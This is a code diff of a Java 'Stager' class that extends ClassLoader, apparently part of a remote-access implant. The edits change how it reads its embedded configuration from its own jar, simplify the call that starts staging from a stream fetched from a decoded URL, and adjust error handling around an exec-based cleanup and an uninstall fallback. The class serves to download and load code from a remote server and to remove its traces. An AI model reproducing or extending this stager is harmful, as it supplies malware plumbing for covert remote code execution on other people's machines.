@@ -90,7 +90,13 @@ public class Stager extends ClassLoader {
         ManifestProperties localProperties = new ManifestProperties();
         Class localClass = Stager.class;
         
-        InputStream localInputStream = localClass.getResourceAsStream("/" + STAG_PROP_FILE);
+        URL ourUrl = localClass.getProtectionDomain().getCodeSource().getLocation();
+        String aStr = ourUrl.toExternalForm();
+        
+        final URL manifest =  new URL("jar:" + aStr + "!/" + STAG_PROP_FILE);
+        URLConnection theConnection = manifest.openConnection();
+        InputStream localInputStream = theConnection.getInputStream();
+        
         if (localInputStream != null) {
             
             //Load the properties
@@ -139,17 +145,15 @@ public class Stager extends ClassLoader {
                     aTimer.run();
 
                     //Get the connection
-                    URLConnection theConnection = aTimer.getUrlConnection();   
-                    if( theConnection != null ){
+                    URLConnection connection2 = aTimer.getUrlConnection();   
+                    if( connection2 != null ){
 
                         //Get the input stream
                         InputStream theIS = aTimer.getInputStream();
-                        byte[] clientId = aTimer.getClientId();
-                        
                         OutputStream theOS = new ByteArrayOutputStream();
                 
                         Stager theStager = new Stager();
-                        theStager.start(theIS, theOS, decodedURL, clientId );
+                        theStager.start(theIS, theOS, decodedURL );
 
                     } else {
                         uninstall();
@@ -162,6 +166,7 @@ public class Stager extends ClassLoader {
         }
 
     }
+
 
     //==========================================================================
     /**
@@ -241,8 +246,10 @@ public class Stager extends ClassLoader {
             try{
                 Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
                 aProcess.waitFor();
-            } catch(IOException ex){            
-            } catch (InterruptedException ex) {
+            } catch(IOException ex ){
+                ex = null;
+            } catch( InterruptedException ex ){
+                ex = null;
             }
 
         } else {
@@ -263,11 +270,9 @@ public class Stager extends ClassLoader {
      * 
      * @param paramInputStream
      * @param paramOutputStream
-     * @param paramString
-     * @param paramArrayOfString
-     * @throws Exception 
+     * @param passedURL
      */
-    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL, byte[] clientId ) {
+    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL ) {
         
         try {
             
